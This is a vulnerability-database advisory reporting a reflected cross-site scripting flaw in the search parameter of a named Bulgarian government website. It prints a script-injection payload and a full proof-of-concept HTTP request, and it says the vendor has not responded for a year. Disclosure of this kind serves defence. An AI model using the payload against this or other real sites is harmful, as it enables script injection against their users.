---
title: ahu.mlsp.government.bg-XSS-Reflected-CRITICAL Cross-site scripting
url: https://cxsecurity.com/issue/WLB-2026010012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-01-20
fetch_date: 2026-01-21T03:29:43.260168
---

# ahu.mlsp.government.bg-XSS-Reflected-CRITICAL Cross-site scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ahu.mlsp.government.bg-XSS-Reflected-CRITICAL Cross-site scripting** **2026.01.20**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Happy New Year, dear friends. The same case: one year, nobody responds to this report!
## Titles: ahu.mlsp.government.bg-XSS-Reflected-CRITICAL Cross-site scripting (reflected)
## Author: nu11secur1ty
## Date: 1/18/2026
## Vendor: ahu.mlsp.government.bg
## Software: ahu.mlsp.government.bg
## Reference: https://portswigger.net/web-security/cross-site-scripting
## Description:
The value of the `keywords` request parameter is copied into the HTML document as plain text between tags. The payload fpizv<script>alert(1)</script>b6a49ruc4py was submitted in the keywords parameter. This input was echoed unmodified in the application's response. This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response. The original request used the POST method, however it was possible to convert the request to use the GET method, to enable easier demonstration and delivery of the attack.
STATUS: HIGH- Vulnerability
[+]PoC:
```
GET /search/?keywords=fpizv%3cscript%3ealert(1)%3c%2fscript%3eb6a49ruc4py HTTP/1.1
Host: ahu.mlsp.government.bg
Cache-Control: max-age=0
Sec-CH-UA: "Chromium";v="143", "Not;A=Brand";v="24", "Google Chrome";v="143"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "Windows"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=B73DAEC7FBA9D531A0EA45F18C6A5B19
Origin: null
Upgrade-Insecure-Requests: 1
```
## Demo PoC:
[href](https://www.patreon.com/posts/ahu-mlsp-bg-xss-148520630)
## Time spent:
01:27:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://nu11secur1ty.blogspot.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026010012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top